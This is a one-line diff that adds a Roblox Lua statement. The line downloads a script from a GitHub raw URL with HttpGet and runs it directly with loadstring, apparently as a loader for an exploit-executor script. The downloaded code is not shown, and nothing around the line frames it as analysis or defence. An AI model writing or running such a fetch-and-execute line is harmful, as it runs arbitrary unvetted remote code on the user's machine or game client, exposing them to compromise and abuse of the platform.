@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/voidy434343/control/main/Control%20before%20execution.txt'))() 
